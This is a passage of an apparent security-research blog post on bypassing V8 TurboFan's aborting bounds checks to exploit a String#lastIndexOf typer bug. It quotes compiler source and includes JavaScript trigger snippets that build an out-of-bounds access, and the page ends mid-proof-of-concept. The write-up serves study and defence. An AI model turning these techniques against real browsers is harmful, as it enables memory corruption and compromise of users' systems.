<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Circumventing Chrome's hardening of typer bugs</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="Axel '0vercl0k' Souchet">
    <link rel="stylesheet" href="../../../../../theme/css/bootstrap.min.css" type="text/css" />
    <style type="text/css">
      body {
        padding-top: 60px;
        padding-bottom: 40px;
      }
      .sidebar-nav {
        padding: 9px 0;
      }
      .tag-1 {
        font-size: 13pt;
      }
      .tag-2 {
        font-size: 10pt;
      }
      .tag-2 {
        font-size: 8pt;
      }
      .tag-4 {
        font-size: 6pt;
     }
    </style>
    <link href="../../../../../theme/css/bootstrap-responsive.min.css" rel="stylesheet" />
    <link href="../../../../../theme/css/font-awesome.css" rel="stylesheet" />
    <link href="../../../../../theme/css/pygments.css" rel="stylesheet" />

    <!--[if lt IE 9]>
      <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <link href="../../../../../feeds/atom.xml" type="application/atom+xml" rel="alternate" title="Diary of a reverse-engineer ATOM Feed" />
    <link href="../../../../../feeds/rss.xml" type="application/atom+xml" rel="alternate" title="Diary of a reverse-engineer RSS Feed" />

  </head>

  <body>

    <div class="navbar navbar-fixed-top">
      <div class="navbar-inner">
        <div class="container-fluid">
          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </a>
          <a class="brand" href="../../../../../index.html">Diary of a reverse-engineer </a>
          <div class="nav-collapse">
            <ul class="nav">
              <ul class="nav">
                    <li><a href="../../../../../archives.html"><i class="icon-th-list"></i>Archives</a></li>
              </ul>

                <li >
                    <a href="../../../../../category/debugging.html">
                      <i class="icon-folder-open icon-large"></i>debugging
                    </a>
                </li>
                <li class="active">
                    <a href="../../../../../category/exploitation.html">
                      <i class="icon-folder-open icon-large"></i>exploitation
                    </a>
                </li>
                <li >
                    <a href="../../../../../category/misc.html">
                      <i class="icon-folder-open icon-large"></i>misc
                    </a>
                </li>
                <li >
                    <a href="../../../../../category/obfuscation.html">
                      <i class="icon-folder-open icon-large"></i>obfuscation
                    </a>
                </li>
                <li >
                    <a href="../../../../../category/reverse-engineering.html">
                      <i class="icon-folder-open icon-large"></i>reverse-engineering
                    </a>
                </li>

                <li><a href="../../../../../pages/about.html">About</a></li>
                <li><a href="../../../../../pages/presentations.html">Presentations</a></li>

            </ul>
          </div><!--/.nav-collapse -->
        </div>
      </div>
    </div>

    <div class="container-fluid">
      <div class="row">
        <div class="span9" id="content">
<section id="content">
        <article>
                <header>
                        <h1>
                                <a href=""
                                        rel="bookmark"
                                        title="Permalink to Circumventing Chrome's hardening of typer bugs">
                                        Circumventing Chrome's hardening of typer bugs
                                </a>
                        </h1>
                </header>
                <div class="entry-content">
                <div class="well">
<footer class="post-info">
<span class="label">Date</span>
<abbr class="published" title="2019-05-09T08:00:00-07:00">
        <i class="icon-calendar"></i>Thu 09 May 2019
</abbr>
<span class="label">By</span>
<a href="../../../../../author/jeremy-__x86-fetiveau.html"><i class="icon-user"></i>Jeremy "__x86" Fetiveau</a>
<span class="label">Category</span>
<a href="../../../../../category/exploitation.html"><i class="icon-folder-open"></i>exploitation</a>


<span class="label">Tags</span>
	<a href="../../../../../tag/v8.html"><i class="icon-tag"></i>v8</a>
	<a href="../../../../../tag/turbofan.html"><i class="icon-tag"></i>turbofan</a>
	<a href="../../../../../tag/chrome.html"><i class="icon-tag"></i>chrome</a>
	<a href="../../../../../tag/exploitation.html"><i class="icon-tag"></i>exploitation</a>
</footer><!-- /.post-info -->                </div>
                <h1 id="introduction">Introduction</h1>
<p>Some <a href="http://eternalsakura13.com/2018/11/19/justintime/">recent</a> <a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8">Chrome</a> <a href="https://www.jaybosamiya.com/blog/2019/01/02/krautflare/">exploits</a> were taking advantage of <a href="https://en.wikipedia.org/wiki/Bounds-checking_elimination">Bounds-Check-Elimination</a> in order to get a R/W primitive from a TurboFan's typer bug (a bug that incorrectly computes type information during code optimization). Indeed during the simplified lowering phase when visiting a CheckBounds node if the engine can guarantee that the used index is always in-bounds then the CheckBounds is considered redundant and thus removed. I explained this <a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#simplified-lowering">in my previous article</a>. 
Recently, TurboFan introduced a change that adds  <a href="https://bugs.chromium.org/p/v8/issues/detail?id=8806">aborting bound checks</a>. It means that CheckBounds will never get removed during simplified lowering. As mentioned by <a href="https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html">Mark Brand's article on the Google Project Zero blog</a> and <a href="https://twitter.com/_tsuro">tsuro</a> in his <a href="https://docs.google.com/presentation/d/1DJcWByz11jLoQyNhmOvkZSrkgcVhllIlCHmal1tGzaw">zer0con talk</a>, this could be problematic for exploitation.
This short post discusses the hardening change and how to exploit typer bugs against latest versions of v8.
As an example, I provide a <a href="https://github.com/JeremyFetiveau/TurboFan-exploit-for-issue-762874">sample exploit that works on v8 7.5.0</a>. </p>


<div class="toc"><span class="toctitle">Table of contents:</span><ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#introduction-of-aborting-bound-checks">Introduction of aborting bound checks</a><ul>
<li><a href="#simplified-lowering">Simplified lowering</a></li>
<li><a href="#effect-linearization">Effect linearization</a></li>
</ul>
</li>
<li><a href="#experimenting">Experimenting</a><ul>
<li><a href="#ordinary-behaviour">Ordinary behaviour</a><ul>
<li><a href="#typing-of-a-checkbounds">Typing of a CheckBounds</a></li>
<li><a href="#checkbounds-lowering-to-checkeduint32bounds">CheckBounds lowering to CheckedUint32Bounds</a></li>
<li><a href="#effect-linearization-checkeduint32bounds-to-uint32lessthan-with-unreachable">Effect Linearization :  CheckedUint32Bounds to Uint32LessThan with Unreachable</a></li>
<li><a href="#late-optimization-machineoperatorreducer-and-deadcodeelimination">Late optimization : MachineOperatorReducer and DeadCodeElimination</a></li>
<li><a href="#final-scheduling-no-more-bound-checking">Final scheduling : no more bound checking</a></li>
<li><a href="#generated-assembly-code">Generated assembly code</a></li>
</ul>
</li>
<li><a href="#typer-bug">Typer bug</a><ul>
<li><a href="#native-context-specialization-of-an-element-access">Native context specialization of an element access</a></li>
<li><a href="#type-narrowing-and-constant-folding-of-numberlessthan">Type narrowing and constant folding of NumberLessThan</a></li>
<li><a href="#observing-the-generated-assembly">Observing the generated assembly</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#conclusion">Conclusion</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>
<h1 id="introduction-of-aborting-bound-checks">Introduction of aborting bound checks</h1>
<p>Aborting bounds checks have been introduced by the following commit: </p>
<div class="highlight"><pre><span></span><code>commit 7bb6dc0e06fa158df508bc8997f0fce4e33512a5
Author: Jaroslav Sevcik &lt;jarin@chromium.org&gt;
Date:   Fri Feb 8 16:26:18 2019 +0100

    [turbofan] Introduce aborting bounds checks.

    Instead of eliminating bounds checks based on types, we introduce
    an aborting bounds check that crashes rather than deopts.

    Bug: v8:8806
    Change-Id: Icbd9c4554b6ad20fe4135b8622590093679dac3f
    Reviewed-on: https://chromium-review.googlesource.com/c/1460461
    Commit-Queue: Jaroslav Sevcik &lt;jarin@chromium.org&gt;
    Reviewed-by: Tobias Tebbi &lt;tebbi@chromium.org&gt;
    Cr-Commit-Position: refs/heads/master@{#59467}
</code></pre></div>


<h2 id="simplified-lowering">Simplified lowering</h2>
<p>First, what has changed is the CheckBounds node visitor of <code>simplified-lowering.cc</code>:</p>
<div class="highlight"><pre><span></span><code>  <span class="kt">void</span> <span class="nf">VisitCheckBounds</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">,</span> <span class="n">SimplifiedLowering</span><span class="o">*</span> <span class="n">lowering</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">CheckParameters</span> <span class="k">const</span><span class="o">&amp;</span> <span class="n">p</span> <span class="o">=</span> <span class="n">CheckParametersOf</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">());</span>
    <span class="n">Type</span> <span class="k">const</span> <span class="n">index_type</span> <span class="o">=</span> <span class="n">TypeOf</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">InputAt</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
    <span class="n">Type</span> <span class="k">const</span> <span class="n">length_type</span> <span class="o">=</span> <span class="n">TypeOf</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">InputAt</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">length_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">Unsigned31</span><span class="p">()))</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">index_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">Integral32OrMinusZero</span><span class="p">()))</span> <span class="p">{</span>
        <span class="c1">// Map -0 to 0, and the values in the [-2^31,-1] range to the</span>
        <span class="c1">// [2^31,2^32-1] range, which will be considered out-of-bounds</span>
        <span class="c1">// as well, because the {length_type} is limited to Unsigned31.</span>
        <span class="n">VisitBinop</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">UseInfo</span><span class="o">::</span><span class="n">TruncatingWord32</span><span class="p">(),</span>
                   <span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kWord32</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">())</span> <span class="p">{</span>
          <span class="n">CheckBoundsParameters</span><span class="o">::</span><span class="n">Mode</span> <span class="n">mode</span> <span class="o">=</span>
              <span class="n">CheckBoundsParameters</span><span class="o">::</span><span class="n">kDeoptOnOutOfBounds</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">lowering</span><span class="o">-&gt;</span><span class="n">poisoning_level_</span> <span class="o">==</span>
                  <span class="n">PoisoningMitigationLevel</span><span class="o">::</span><span class="n">kDontPoison</span> <span class="o">&amp;&amp;</span>
              <span class="p">(</span><span class="n">index_type</span><span class="p">.</span><span class="n">IsNone</span><span class="p">()</span> <span class="o">||</span> <span class="n">length_type</span><span class="p">.</span><span class="n">IsNone</span><span class="p">()</span> <span class="o">||</span>
               <span class="p">(</span><span class="n">index_type</span><span class="p">.</span><span class="n">Min</span><span class="p">()</span> <span class="o">&gt;=</span> <span class="mf">0.0</span> <span class="o">&amp;&amp;</span>
                <span class="n">index_type</span><span class="p">.</span><span class="n">Max</span><span class="p">()</span> <span class="o">&lt;</span> <span class="n">length_type</span><span class="p">.</span><span class="n">Min</span><span class="p">())))</span> <span class="p">{</span>
            <span class="c1">// The bounds check is redundant if we already know that</span>
            <span class="c1">// the index is within the bounds of [0.0, length[.</span>
            <span class="n">mode</span> <span class="o">=</span> <span class="n">CheckBoundsParameters</span><span class="o">::</span><span class="n">kAbortOnOutOfBounds</span><span class="p">;</span>         <span class="c1">// [1]</span>
          <span class="p">}</span>
          <span class="n">NodeProperties</span><span class="o">::</span><span class="n">ChangeOp</span><span class="p">(</span>
              <span class="n">node</span><span class="p">,</span> <span class="n">simplified</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">CheckedUint32Bounds</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">feedback</span><span class="p">(),</span> <span class="n">mode</span><span class="p">));</span> <span class="c1">// [2]</span>
        <span class="p">}</span>
<span class="c1">// [...]</span>
  <span class="p">}</span>
</code></pre></div>


<p>Before the commit, if condition [1] happens, the bound check <a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#simplified-lowering">would have been removed</a> using a call to <code>DeferReplacement(node, node-&gt;InputAt(0));</code>. Now, what happens instead is that the node gets lowered to a CheckedUint32Bounds with a AbortOnOutOfBounds mode [2].</p>
<h2 id="effect-linearization">Effect linearization</h2>
<p>When the effect control linearizer (one of the optimization phase) kicks in, here is how the CheckedUint32Bounds gets lowered : </p>
<div class="highlight"><pre><span></span><code><span class="n">Node</span><span class="o">*</span> <span class="n">EffectControlLinearizer</span><span class="o">::</span><span class="n">LowerCheckedUint32Bounds</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">,</span>
                                                        <span class="n">Node</span><span class="o">*</span> <span class="n">frame_state</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">Node</span><span class="o">*</span> <span class="n">index</span> <span class="o">=</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">InputAt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">Node</span><span class="o">*</span> <span class="n">limit</span> <span class="o">=</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">InputAt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">const</span> <span class="n">CheckBoundsParameters</span><span class="o">&amp;</span> <span class="n">params</span> <span class="o">=</span> <span class="n">CheckBoundsParametersOf</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">());</span>

  <span class="n">Node</span><span class="o">*</span> <span class="n">check</span> <span class="o">=</span> <span class="n">__</span> <span class="n">Uint32LessThan</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">limit</span><span class="p">);</span>
  <span class="k">switch</span> <span class="p">(</span><span class="n">params</span><span class="p">.</span><span class="n">mode</span><span class="p">())</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">CheckBoundsParameters</span><span class="o">::</span><span class="nl">kDeoptOnOutOfBounds</span><span class="p">:</span>
      <span class="n">__</span> <span class="n">DeoptimizeIfNot</span><span class="p">(</span><span class="n">DeoptimizeReason</span><span class="o">::</span><span class="n">kOutOfBounds</span><span class="p">,</span>
                         <span class="n">params</span><span class="p">.</span><span class="n">check_parameters</span><span class="p">().</span><span class="n">feedback</span><span class="p">(),</span> <span class="n">check</span><span class="p">,</span>
                         <span class="n">frame_state</span><span class="p">,</span> <span class="n">IsSafetyCheck</span><span class="o">::</span><span class="n">kCriticalSafetyCheck</span><span class="p">);</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">CheckBoundsParameters</span><span class="o">::</span><span class="nl">kAbortOnOutOfBounds</span><span class="p">:</span> <span class="p">{</span>
      <span class="k">auto</span> <span class="n">if_abort</span> <span class="o">=</span> <span class="n">__</span> <span class="n">MakeDeferredLabel</span><span class="p">();</span>
      <span class="k">auto</span> <span class="n">done</span> <span class="o">=</span> <span class="n">__</span> <span class="n">MakeLabel</span><span class="p">();</span>

      <span class="n">__</span> <span class="nf">Branch</span><span class="p">(</span><span class="n">check</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">done</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">if_abort</span><span class="p">);</span>

      <span class="n">__</span> <span class="nf">Bind</span><span class="p">(</span><span class="o">&amp;</span><span class="n">if_abort</span><span class="p">);</span>
      <span class="n">__</span> <span class="nf">Unreachable</span><span class="p">();</span>
      <span class="n">__</span> <span class="nf">Goto</span><span class="p">(</span><span class="o">&amp;</span><span class="n">done</span><span class="p">);</span>

      <span class="n">__</span> <span class="nf">Bind</span><span class="p">(</span><span class="o">&amp;</span><span class="n">done</span><span class="p">);</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="n">index</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>


<p>Long story short, the CheckedUint32Bounds is replaced by an Uint32LessThan node (plus the index and limit nodes). In case of an out-of-bounds there will be no deoptimization possible but instead we will reach an Unreachable node.</p>
<p>During instruction selection Unreachable nodes are replaced by breakpoint opcodes.</p>
<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="n">InstructionSelector</span><span class="o">::</span><span class="n">VisitUnreachable</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">OperandGenerator</span> <span class="n">g</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
  <span class="n">Emit</span><span class="p">(</span><span class="n">kArchDebugBreak</span><span class="p">,</span> <span class="n">g</span><span class="p">.</span><span class="n">NoOutput</span><span class="p">());</span>
<span class="p">}</span>
</code></pre></div>


<h1 id="experimenting">Experimenting</h1>
<h2 id="ordinary-behaviour">Ordinary behaviour</h2>
<p>Let's first experiment with some normal behaviour in order to get a grasp of what happens with bound checking. Consider the following code.</p>
<div class="highlight"><pre><span></span><code><span class="kd">var</span> <span class="nx">opt_me</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">];</span>
  <span class="kd">let</span> <span class="nx">badly_typed</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kd">let</span> <span class="nx">idx</span> <span class="o">=</span> <span class="nx">badly_typed</span> <span class="o">*</span> <span class="mi">5</span><span class="p">;</span>
  <span class="k">return</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">idx</span><span class="p">];</span>
<span class="p">};</span>
<span class="nx">opt_me</span><span class="p">();</span>
<span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">opt_me</span><span class="p">);</span>
<span class="nx">opt_me</span><span class="p">();</span>
</code></pre></div>


<p>With this example, we're going to observe a few things: </p>
<ul>
<li>simplified lowering does not remove the CheckBounds node as it would have before,</li>
<li>the lowering of this node and how it leads to the creation of an Unreachable node,</li>
<li>eventually, bound checking will get completely removed (which is correct and expected).</li>
</ul>
<h3 id="typing-of-a-checkbounds">Typing of a CheckBounds</h3>
<p>Without surprise, a CheckBounds node is generated and gets a type of Range(0,0) during the typer phase.</p>
<p><center><img alt="typer" src="/images/turbofan_bce/typer.png"></center></p>
<h3 id="checkbounds-lowering-to-checkeduint32bounds">CheckBounds lowering to CheckedUint32Bounds</h3>
<p>The CheckBounds node is not removed during simplified lowering the way it would have been before. It is lowered to a CheckedUint32Bounds instead.</p>
<p><center><img alt="simplified_lowering" src="/images/turbofan_bce/simplified_lowering.png"></center></p>
<h3 id="effect-linearization-checkeduint32bounds-to-uint32lessthan-with-unreachable">Effect Linearization :  CheckedUint32Bounds to Uint32LessThan with Unreachable</h3>
<p>Let's have a look at the effect linearization.</p>
<p><center><img alt="effect_linearization_schedule" src="/images/turbofan_bce/effect_linearization_schedule.png"></center></p>
<p><center><img alt="effect_linearization" src="/images/turbofan_bce/effect_linearization.png"></center></p>
<p>The CheckedUint32Bounds is replaced by several nodes. Instead of this bound checking node, there is a Uint32LessThan node that either leads to a LoadElement node or an Unreachable node.</p>
<h3 id="late-optimization-machineoperatorreducer-and-deadcodeelimination">Late optimization : MachineOperatorReducer and DeadCodeElimination</h3>
<p>It seems pretty obvious that the Uint32LessThan can be lowered to a constant true (Int32Constant).  In the case of Uint32LessThan being replaced by a constant node the rest of the code, including the Unreachable node, will be removed by the dead code elimination. Therefore, no bounds check remains and no breakpoint will ever be reached, regardless of any OOB accesses that are attempted.</p>
<div class="highlight"><pre><span></span><code><span class="c1">// Perform constant folding and strength reduction on machine operators.</span>
<span class="n">Reduction</span> <span class="n">MachineOperatorReducer</span><span class="o">::</span><span class="n">Reduce</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">switch</span> <span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">opcode</span><span class="p">())</span> <span class="p">{</span>
<span class="c1">// [...]</span>
      <span class="k">case</span> <span class="n">IrOpcode</span><span class="o">::</span><span class="nl">kUint32LessThan</span><span class="p">:</span> <span class="p">{</span>
      <span class="n">Uint32BinopMatcher</span> <span class="n">m</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">left</span><span class="p">().</span><span class="n">Is</span><span class="p">(</span><span class="n">kMaxUInt32</span><span class="p">))</span> <span class="k">return</span> <span class="n">ReplaceBool</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>  <span class="c1">// M &lt; x =&gt; false</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">right</span><span class="p">().</span><span class="n">Is</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="k">return</span> <span class="n">ReplaceBool</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>          <span class="c1">// x &lt; 0 =&gt; false</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">IsFoldable</span><span class="p">())</span> <span class="p">{</span>                                    <span class="c1">// K &lt; K =&gt; K</span>
        <span class="k">return</span> <span class="n">ReplaceBool</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">left</span><span class="p">().</span><span class="n">Value</span><span class="p">()</span> <span class="o">&lt;</span> <span class="n">m</span><span class="p">.</span><span class="n">right</span><span class="p">().</span><span class="n">Value</span><span class="p">());</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">LeftEqualsRight</span><span class="p">())</span> <span class="k">return</span> <span class="n">ReplaceBool</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>  <span class="c1">// x &lt; x =&gt; false</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">left</span><span class="p">().</span><span class="n">IsWord32Sar</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="n">m</span><span class="p">.</span><span class="n">right</span><span class="p">().</span><span class="n">HasValue</span><span class="p">())</span> <span class="p">{</span>
        <span class="n">Int32BinopMatcher</span> <span class="n">mleft</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">left</span><span class="p">().</span><span class="n">node</span><span class="p">());</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">mleft</span><span class="p">.</span><span class="n">right</span><span class="p">().</span><span class="n">HasValue</span><span class="p">())</span> <span class="p">{</span>
          <span class="c1">// (x &gt;&gt; K) &lt; C =&gt; x &lt; (C &lt;&lt; K)</span>
          <span class="c1">// when C &lt; (M &gt;&gt; K)</span>
          <span class="k">const</span> <span class="kt">uint32_t</span> <span class="n">c</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="n">right</span><span class="p">().</span><span class="n">Value</span><span class="p">();</span>
          <span class="k">const</span> <span class="kt">uint32_t</span> <span class="n">k</span> <span class="o">=</span> <span class="n">mleft</span><span class="p">.</span><span class="n">right</span><span class="p">().</span><span class="n">Value</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mh">0x1F</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">&lt;</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">uint32_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">kMaxInt</span> <span class="o">&gt;&gt;</span> <span class="n">k</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">node</span><span class="o">-&gt;</span><span class="n">ReplaceInput</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">mleft</span><span class="p">.</span><span class="n">left</span><span class="p">().</span><span class="n">node</span><span class="p">());</span>
            <span class="n">node</span><span class="o">-&gt;</span><span class="n">ReplaceInput</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">Uint32Constant</span><span class="p">(</span><span class="n">c</span> <span class="o">&lt;&lt;</span> <span class="n">k</span><span class="p">));</span>
            <span class="k">return</span> <span class="nf">Changed</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
          <span class="p">}</span>
          <span class="c1">// TODO(turbofan): else the comparison is always true.</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="c1">// [...]</span>
</code></pre></div>


<p><center><img alt="final_replacement_of_bound_check" src="/images/turbofan_bce/final_replacement_of_bound_check.png"></center></p>
<h3 id="final-scheduling-no-more-bound-checking">Final scheduling : no more bound checking</h3>
<p>To observe the generated code, let's first look at the final scheduling phase and confirm that eventually, only a Load at index 0 remains.</p>
<p><center><img alt="scheduling" src="/images/turbofan_bce/scheduling.png"></center></p>
<h3 id="generated-assembly-code">Generated assembly code</h3>
<p>In this case, TurboFan correctly understood that no bound checking was necessary and simply generated a mov instruction <code>movq rax, [fixed_array_base + offset_to_element_0]</code>.</p>
<p><img alt="final_asm" src="/images/turbofan_bce/final_asm.png"></p>
<p>To sum up : </p>
<ol>
<li>arr[good_idx] leads to the creation of a CheckBounds node in the early phases</li>
<li>during "simplified lowering", it gets replaced by an aborting CheckedUint32Bounds</li>
<li>The CheckedUint32Bounds gets replaced by several nodes during "effect linearization" : Uint32LessThan and Unreachable</li>
<li>Uint32LessThan is constant folded during the "Late Optimization" phase</li>
<li>The Unreachable node is removed during dead code elimination of the "Late Optimization" phase</li>
<li>Only a simple Load remains during the final scheduling</li>
<li>Generated assembly is a simple mov instruction without bound checking</li>
</ol>
<h2 id="typer-bug">Typer bug</h2>
<p>Let's consider <a href="https://chromium-review.googlesource.com/c/v8/v8/+/660000/">the String#lastIndexOf bug</a> where the typing of kStringIndexOf and kStringLastIndexOf is incorrect. The computed type is: 
<code>Type::Range(-1.0, String::kMaxLength - 1.0, t-&gt;zone())</code> instead of <code>Type::Range(-1.0, String::kMaxLength, t-&gt;zone())</code>. This is incorrect because both String#indexOf and String#astIndexOf can return a value of kMaxLength. You can find <a href="https://github.com/JeremyFetiveau/TurboFan-exploit-for-issue-762874/tree/master/trigger">more details about this bug on my github</a>. </p>
<p>This bug is exploitable even with the introduction of aborting bound checks. So let's reintroduce it on v8 7.5 and <a href="https://github.com/JeremyFetiveau/TurboFan-exploit-for-issue-762874/blob/master/exploit.js">exploit it</a>.</p>
<p>In summary, if we use lastIndexOf on a string with a length of kMaxLength, the computed Range type will be kMaxLength - 1 while it is actually kMaxLength. </p>
<div class="highlight"><pre><span></span><code><span class="kr">const</span> <span class="nx">str</span> <span class="o">=</span> <span class="s2">&quot;____&quot;</span><span class="o">+</span><span class="s2">&quot;DOARE&quot;</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="mi">214748359</span><span class="p">);</span>
<span class="nb">String</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">lastIndexOf</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">str</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span> <span class="c1">// typed as kMaxLength-1 instead of kMaxLength</span>
</code></pre></div>


<p>We can then amplify this typing error.</p>
<div class="highlight"><pre><span></span><code>  <span class="kd">let</span> <span class="nx">badly_typed</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">lastIndexOf</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">str</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
  <span class="nx">badly_typed</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">badly_typed</span><span class="p">)</span> <span class="o">+</span> <span class="mi">25</span><span class="p">);</span>
  <span class="nx">badly_typed</span> <span class="o">=</span> <span class="nx">badly_typed</span> <span class="o">&gt;&gt;</span> <span class="mi">30</span><span class="p">;</span> <span class="c1">// type is Range(0,0) instead of Range(1,1)</span>
</code></pre></div>


<p>If all of this seems unclear, check my previous <a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/">introduction to TurboFan</a> and <a href="https://github.com/JeremyFetiveau/TurboFan-exploit-for-issue-762874/">my github</a>.</p>
<p>Now, consider the following trigger poc : </p>
<div class="highlight"><pre><span></span><code><span class="nx">SUCCESS</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nx">FAILURE</span> <span class="o">=</span> <span class="mh">0x42</span><span class="p">;</span>

<span class="kr">const</span> <span class="nx">str</span> <span class="o">=</span> <span class="s2">&quot;____&quot;</span><span class="o">+</span><span class="s2">&quot;DOARE&quot;</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="mi">214748359</span><span class="p">);</span>

<span class="kd">let</span> <span class="nx">it</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="kd">var</span> <span class="nx">opt_me</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
  <span class="kr">const</span> <span class="nx">OOB_OFFSET</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>

  <span class="kd">let</span> <span class="nx">badly_typed</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">lastIndexOf</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">str</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
  <span class="nx">badly_typed</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">badly_typed</span><span class="p">)</span> <span class="o">+</span> <span class="mi">25</span><span class="p">);</span>
